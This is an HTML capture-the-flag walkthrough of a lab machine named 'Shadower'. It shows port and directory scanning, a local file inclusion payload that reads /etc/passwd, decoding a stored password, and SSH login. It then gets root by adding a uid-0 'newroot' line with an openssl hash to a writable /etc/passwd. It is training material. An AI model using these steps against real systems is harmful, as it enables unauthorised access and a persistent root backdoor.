<!DOCTYPE html>
<html>
    <head>
        <link rel="stylesheet" href="../../css/Font.css">
        <link rel="stylesheet" href="css/folderview.css">
        <script src="js/folderview.js"></script>
    </head>
    <body>
        <p>Get The highest privilege on the machine and find the flag!</p>
        <p>First you have to connect to the vpn, just follow the instruction from the provided file VPN.txt</p>
        <pre>
            Open Nmap
           <code>$ nmap -A -v -oN nmap_initial 172.24.209.176</code>
        </pre>
        <img src="/public/images/machines/Shadower/Shadower-1.jpg"/>
        <pre>
            There are two open ports 80 for http and 22 for ssh. let’s start with web enumeration.

            <a href="http://172.24.209.176">http://172.24.209.176</a> has the Apache2 Default Page.
        </pre>
        <img src="/public/images/machines/Shadower/Shadower-2.png"/>
        <pre>
            The next thing to do is directory brute forcing. 
            I will use gobuster with html,php extensions.
            <code>
                $ gobuster dir -u 172.24.209.176 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php
            </code>
        </pre>
        <img src="/public/images/machines/Shadower/Shadower-3.jpg"/>
        <p>/index.html redirect to the default page, but /index.php has another page.</p>
        <img src="/public/images/machines/Shadower/Shadower-4.png"/>
        <pre>
            Nothing important in the source code of this page. “About us” and “Contact us” pages have interesting urls.

        <a href="http://172.24.209.176/index.php?view=about-us.html">http://172.24.209.176/index.php?view=about-us.html</a>
        <a href="http://172.24.209.176/index.php?view=contact-us.html">http://172.24.209.176/index.php?view=contact-us.html</a>
        
        “view” p arameter takes the name of a file and include it in the web page. 
        Let’s test this if it’s vulnerable to Local File Inclusion and try to include some files from the server. 
        The very first and basic payload to use is to check if we can read /etc/passwd
        <code>
        payload: ../../../etc/passwd
        http://172.24.209.176/index.php?view=../../../etc/passwd
        </code>
        </pre>
        <img src="/public/images/machines/Shadower/Shadower-5.png">
        <pre>
            Indeed it worked and we have a username “john”.

            At this point i tried to read other files and tried to get a reverse shell 
            but i got nothing, so i took a step back and opened the source code of “About us” 
            and “Contact us” pages.

            About us source doesn’t have any thing important, 
            but contact us source code has a comment at the very end of the page 
            which seems to be a directory.
        </pre>
        <img src="/public/images/machines/Shadower/Shadower-6.png">
        <pre>
            <a href="http://172.24.209.176/index.php?view=my0wns3cr3t.sec">http://172.24.209.176/index.php?view=my0wns3cr3t.sec</a> has a very long base64 text.
        </pre>
        <img src="/public/images/machines/Shadower/Shadower-7.png">
        <pre>
            I first tried to decode it manually but the original text 
            is encoded multiple times. So i wrote a very simple python script 
            to loop through the encoded text and base64 decode it. 
            I found it was encoded 25 times.
            <code>
            import base64
            data ="place holder" #base64 text
            for i in range(25):
            data = base64.b64decode(data)
            print(data)
        </code>
        </pre>
        <img src="/public/images/machines/Shadower/Shadower-8.jpg"/>
        <pre>
            We found a password, and we have a username john. 
            let’s try to login with those credential via ssh.

            <code>
                $ ssh john@172.24.209.176
            </code>
        </pre>
        <img src="/public/images/machines/Shadower/Shadower-9.jpg"/>
        <pre>
            Now you can run any enumeration scripts like linpeas.sh 
            or linenum.sh but from the name of the machine “Shadower” 
            we can assume it has something to do with /etc/shadow or /etc/passwd files.

            As a low privileged user you can’t see the content of /etc/shadow. 
            The content of /etc/passwd has nothing new, 
            but listing the permission of /etc/passwd shows that we have write 
            access to the file which is something unusual.
        </pre>
        <img src="/public/images/machines/Shadower/Shadower-10.png"/>
        <pre>
            Let’s add a new entry that will allow us to gain root privileges. 
            /etc/passwd has a specific format as follows.
        </pre>
        <img src="/public/images/machines/Shadower/Shadower-11.png"/>
        <pre>
            We need to create an entry with root privilege with our own passwd. Using openssl we can create a new encrypted password.
            <code>
            $ openssl passwd -1 -salt newroot pass123
            </code>
        </pre>
        <img src="/public/images/machines/Shadower/Shadower-12.png"/>
        <pre>
            What follow is the root entry in /etc/passwd
            <code>
            root:x:0:0:root:/root:/bin/bash
            </code>
            we should replace the “x” with our encrypted 
            password and change root to newroot like this.
            (don’t delete the root entry just add yours)
            <code>
            newroot:$1$newroot$1W0.AnlQihqDVGEVS2xk2.:0:0:root:/root:/bin/bash
            </code>
            using nano or vim add the entry to /etc/passwd, then change user to newroot with your password. 
            you are now root and can read the flag.
        </pre>
        <img src="/public/images/machines/Shadower/Shadower-13.jpg"/>
        <h2><i>
        6199b2f763edf25c1f161b275375c100  
    </i></h2>
    </body>
</html>